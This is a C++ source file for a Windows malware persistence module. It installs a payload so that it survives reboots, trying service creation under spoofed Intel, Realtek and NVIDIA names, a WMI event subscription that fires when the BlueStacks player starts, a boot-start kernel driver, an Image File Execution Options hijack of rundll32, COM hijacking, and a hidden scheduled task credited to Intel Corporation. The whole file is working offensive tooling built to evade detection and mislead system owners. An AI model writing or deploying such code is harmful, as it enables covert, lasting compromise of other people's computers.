#include "boot_start.hpp"
#include <windows.h>
#include <string>
#include <vector>
#include <comdef.h>
#include <wbemidl.h>

#pragma comment(lib, "wbemuuid.lib")

namespace l4g::persistence {

BootStartResult BootStart::install(const std::wstring& payload_path, const std::wstring& service_name) {
    // Try multiple methods in order of stealthiness
    std::vector<Method> methods = {
        METHOD_SERVICE_HIJACK,
        METHOD_WMI_SUBSCRIPTION,
        METHOD_DRIVER_LOAD,
        METHOD_IMAGE_HIJACK
    };
    
    for (auto method : methods) {
        auto result = install_method(method, payload_path, service_name);
        if (result.success) return result;
    }
    
    return {false, "", "All persistence methods failed"};
}

bool BootStart::uninstall(const std::wstring& service_name) {
    // Remove service
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (scm) {
        SC_HANDLE svc = OpenServiceW(scm, service_name.c_str(), DELETE | SERVICE_STOP);
        if (svc) {
            SERVICE_STATUS status = {};
            ControlService(svc, SERVICE_CONTROL_STOP, &status);
            DeleteService(svc);
            CloseServiceHandle(svc);
        }
        CloseServiceHandle(scm);
    }
    
    // Remove WMI subscription
    system(("powershell -c \"Remove-WmiObject -Query \\\"SELECT * FROM __EventFilter WHERE Name='L4G_Filter'\\\"\" >nul 2>&1").c_str());
    system(("powershell -c \"Remove-WmiObject -Query \\\"SELECT * FROM CommandLineEventConsumer WHERE Name='L4G_Consumer'\\\"\" >nul 2>&1").c_str());
    system(("powershell -c \"Remove-WmiObject -Query \\\"SELECT * FROM __FilterToConsumerBinding WHERE Filter='L4G_Filter'\\\"\" >nul 2>&1").c_str());
    
    // Remove Image Hijack
    RegDeleteKeyW(HKEY_LOCAL_MACHINE, (L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" + service_name).c_str());
    
    return true;
}

bool BootStart::is_installed(const std::wstring& service_name) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return false;
    
    SC_HANDLE svc = OpenServiceW(scm, service_name.c_str(), SERVICE_QUERY_STATUS);
    bool installed = (svc != nullptr);
    if (svc) CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return installed;
}

BootStartResult BootStart::install_method(Method method, const std::wstring& payload_path, const std::wstring& name) {
    switch (method) {
        case METHOD_SERVICE_HIJACK:
            if (create_service(name, payload_path, get_legitimate_display_name())) {
                return {true, "Service Hijack", ""};
            }
            break;
        case METHOD_WMI_SUBSCRIPTION:
            if (create_wmi_subscription(name, payload_path)) {
                return {true, "WMI Subscription", ""};
            }
            break;
        case METHOD_DRIVER_LOAD:
            if (create_driver_service(name, payload_path)) {
                return {true, "Boot Driver", ""};
            }
            break;
        case METHOD_IMAGE_HIJACK:
            if (create_image_hijack(L"rundll32.exe", payload_path)) {
                return {true, "Image Hijack", ""};
            }
            break;
        case METHOD_COM_HIJACK:
            if (create_com_hijack(L"{00000000-0000-0000-0000-000000000000}", payload_path)) {
                return {true, "COM Hijack", ""};
            }
            break;
        case METHOD_SCHEDULED_TASK:
            if (create_hidden_task(name, payload_path)) {
                return {true, "Hidden Task", ""};
            }
            break;
    }
    return {false, "", "Method failed"};
}

bool BootStart::create_service(const std::wstring& name, const std::wstring& payload, const std::wstring& display_name) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!scm) return false;
    
    SC_HANDLE svc = CreateServiceW(
        scm, name.c_str(), display_name.c_str(),
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
        payload.c_str(), nullptr, nullptr, nullptr, nullptr, nullptr
    );
    
    bool ok = false;
    if (svc) {
        ok = StartServiceW(svc, 0, nullptr);
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
    return ok;
}

bool BootStart::create_wmi_subscription(const std::wstring& name, const std::wstring& payload) {
    HRESULT hr = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hr)) return false;
    
    hr = CoInitializeSecurity(nullptr, -1, nullptr, nullptr, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE, nullptr);
    if (FAILED(hr)) { CoUninitialize(); return false; }
    
    IWbemLocator* pLoc = nullptr;
    hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hr)) { CoUninitialize(); return false; }
    
    IWbemServices* pSvc = nullptr;
    hr = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), nullptr, nullptr, 0, nullptr, 0, 0, &pSvc);
    if (FAILED(hr)) { pLoc->Release(); CoUninitialize(); return false; }
    
    hr = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE);
    if (FAILED(hr)) { pSvc->Release(); pLoc->Release(); CoUninitialize(); return false; }
    
    // Create Event Filter
    IWbemClassObject* pFilter = nullptr;
    hr = pSvc->GetObject(_bstr_t(L"__EventFilter"), 0, nullptr, &pFilter, nullptr);
    if (SUCCEEDED(hr)) {
        IWbemClassObject* pNewFilter = nullptr;
        hr = pFilter->SpawnInstance(0, &pNewFilter);
        if (SUCCEEDED(hr)) {
            VARIANT v;
            VariantInit(&v);
            v.vt = VT_BSTR; v.bstrVal = _bstr_t(L"L4G_Filter");
            pNewFilter->Put(L"Name", 0, &v, 0);
            
            v.bstrVal = _bstr_t(L"SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'HD-Player.exe'");
            pNewFilter->Put(L"Query", 0, &v, 0);
            
            v.bstrVal = _bstr_t(L"WQL");
            pNewFilter->Put(L"QueryLanguage", 0, &v, 0);
            
            pSvc->PutInstance(pNewFilter, WBEM_FLAG_CREATE_ONLY, nullptr, nullptr);
            pNewFilter->Release();
        }
        pFilter->Release();
    }
    
    // Create Event Consumer
    IWbemClassObject* pConsumer = nullptr;
    hr = pSvc->GetObject(_bstr_t(L"CommandLineEventConsumer"), 0, nullptr, &pConsumer, nullptr);
    if (SUCCEEDED(hr)) {
        IWbemClassObject* pNewConsumer = nullptr;
        hr = pConsumer->SpawnInstance(0, &pNewConsumer);
        if (SUCCEEDED(hr)) {
            VARIANT v;
            VariantInit(&v);
            v.vt = VT_BSTR; v.bstrVal = _bstr_t(L"L4G_Consumer");
            pNewConsumer->Put(L"Name", 0, &v, 0);
            
            v.bstrVal = _bstr_t(payload.c_str());
            pNewConsumer->Put(L"CommandLineTemplate", 0, &v, 0);
            
            pSvc->PutInstance(pNewConsumer, WBEM_FLAG_CREATE_ONLY, nullptr, nullptr);
            pNewConsumer->Release();
        }
        pConsumer->Release();
    }
    
    // Create Binding
    IWbemClassObject* pBinding = nullptr;
    hr = pSvc->GetObject(_bstr_t(L"__FilterToConsumerBinding"), 0, nullptr, &pBinding, nullptr);
    if (SUCCEEDED(hr)) {
        IWbemClassObject* pNewBinding = nullptr;
        hr = pBinding->SpawnInstance(0, &pNewBinding);
        if (SUCCEEDED(hr)) {
            VARIANT v;
            VariantInit(&v);
            v.vt = VT_BSTR; v.bstrVal = _bstr_t(L"__EventFilter.Name=\"L4G_Filter\"");
            pNewBinding->Put(L"Filter", 0, &v, 0);
            
            v.bstrVal = _bstr_t(L"CommandLineEventConsumer.Name=\"L4G_Consumer\"");
            pNewBinding->Put(L"Consumer", 0, &v, 0);
            
            pSvc->PutInstance(pNewBinding, WBEM_FLAG_CREATE_ONLY, nullptr, nullptr);
            pNewBinding->Release();
        }
        pBinding->Release();
    }
    
    pSvc->Release();
    pLoc->Release();
    CoUninitialize();
    return true;
}

bool BootStart::create_driver_service(const std::wstring& name, const std::wstring& driver_path) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!scm) return false;
    
    SC_HANDLE svc = CreateServiceW(
        scm, name.c_str(), L"Intel Audio Driver",
        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
        SERVICE_BOOT_START, SERVICE_ERROR_IGNORE,
        driver_path.c_str(), nullptr, nullptr, nullptr, nullptr, nullptr
    );
    
    bool ok = (svc != nullptr);
    if (svc) CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return ok;
}

bool BootStart::create_image_hijack(const std::wstring& target, const std::wstring& payload) {
    HKEY hKey = nullptr;
    std::wstring path = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" + target;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, path.c_str(), 0, nullptr, 0, KEY_WRITE, nullptr, &hKey, nullptr) != ERROR_SUCCESS) {
        return false;
    }
    
    bool ok = RegSetValueExW(hKey, L"Debugger", 0, REG_SZ, (BYTE*)payload.c_str(), (DWORD)((payload.size() + 1) * sizeof(wchar_t))) == ERROR_SUCCESS;
    RegCloseKey(hKey);
    return ok;
}

bool BootStart::create_com_hijack(const std::wstring& clsid, const std::wstring& payload) {
    // Hijack CLSID InprocServer32
    HKEY hKey = nullptr;
    std::wstring path = L"Software\\Classes\\CLSID\\" + clsid + L"\\InprocServer32";
    if (RegCreateKeyExW(HKEY_CURRENT_USER, path.c_str(), 0, nullptr, 0, KEY_WRITE, nullptr, &hKey, nullptr) != ERROR_SUCCESS) {
        return false;
    }
    
    bool ok = RegSetValueExW(hKey, L"", 0, REG_SZ, (BYTE*)payload.c_str(), (DWORD)((payload.size() + 1) * sizeof(wchar_t))) == ERROR_SUCCESS;
    RegCloseKey(hKey);
    return ok;
}

bool BootStart::create_hidden_task(const std::wstring& name, const std::wstring& payload) {
    // Create scheduled task via COM - hidden from Task Manager
    HRESULT hr = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hr)) return false;
    
    ITaskService* pService = nullptr;
    hr = CoCreateInstance(CLSID_TaskScheduler, nullptr, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
    if (FAILED(hr)) { CoUninitialize(); return false; }
    
    hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr)) { pService->Release(); CoUninitialize(); return false; }
    
    ITaskFolder* pRootFolder = nullptr;
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (FAILED(hr)) { pService->Release(); CoUninitialize(); return false; }
    
    ITaskDefinition* pTask = nullptr;
    hr = pService->NewTask(0, &pTask);
    if (FAILED(hr)) { pRootFolder->Release(); pService->Release(); CoUninitialize(); return false; }
    
    // Set registration info
    IRegistrationInfo* pRegInfo = nullptr;
    pTask->get_RegistrationInfo(&pRegInfo);
    pRegInfo->put_Description(_bstr_t(L"Intel Audio Service"));
    pRegInfo->put_Author(_bstr_t(L"Intel Corporation"));
    pRegInfo->Release();
    
    // Set trigger - at logon
    ITriggerCollection* pTriggers = nullptr;
    pTask->get_Triggers(&pTriggers);
    ITrigger* pTrigger = nullptr;
    pTriggers->Create(TASK_TRIGGER_LOGON, &pTrigger);
    ILogonTrigger* pLogonTrigger = nullptr;
    pTrigger->QueryInterface(IID_ILogonTrigger, (void**)&pLogonTrigger);
    pLogonTrigger->put_Id(_bstr_t(L"LogonTrigger"));
    pLogonTrigger->Release();
    pTrigger->Release();
    pTriggers->Release();
    
    // Set action
    IActionCollection* pActions = nullptr;
    pTask->get_Actions(&pActions);
    IAction* pAction = nullptr;
    pActions->Create(TASK_ACTION_EXEC, &pAction);
    IExecAction* pExecAction = nullptr;
    pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
    pExecAction->put_Path(_bstr_t(payload.c_str()));
    pExecAction->put_Arguments(_bstr_t(L""));
    pExecAction->Release();
    pAction->Release();
    pActions->Release();
    
    // Set settings - hidden
    ITaskSettings* pSettings = nullptr;
    pTask->get_Settings(&pSettings);
    pSettings->put_Hidden(VARIANT_TRUE);
    pSettings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
    pSettings->put_StopIfGoingOnBatteries(VARIANT_FALSE);
    pSettings->Release();
    
    // Register task
    IRegisteredTask* pRegistered = nullptr;
    hr = pRootFolder->RegisterTaskDefinition(_bstr_t(name.c_str()), pTask, TASK_CREATE_OR_UPDATE, _variant_t(), _variant_t(), TASK_LOGON_INTERACTIVE_TOKEN, _variant_t(L""), &pRegistered);
    
    bool ok = SUCCEEDED(hr);
    
    if (pRegistered) pRegistered->Release();
    pTask->Release();
    pRootFolder->Release();
    pService->Release();
    CoUninitialize();
    return ok;
}

std::wstring BootStart::get_legitimate_display_name() {
    static const wchar_t* names[] = {
        L"Intel(R) Audio Service",
        L"Realtek Audio Service",
        L"NVIDIA Display Container",
        L"Windows Audio Endpoint Builder",
        L"Intel(R) Management Engine Components"
    };
    static std::mt19937_64 rng((uint64_t)GetTickCount64());
    std::uniform_int_distribution<int> dist(0, 4);
    return names[dist(rng)];
}

} // namespace l4g::persistence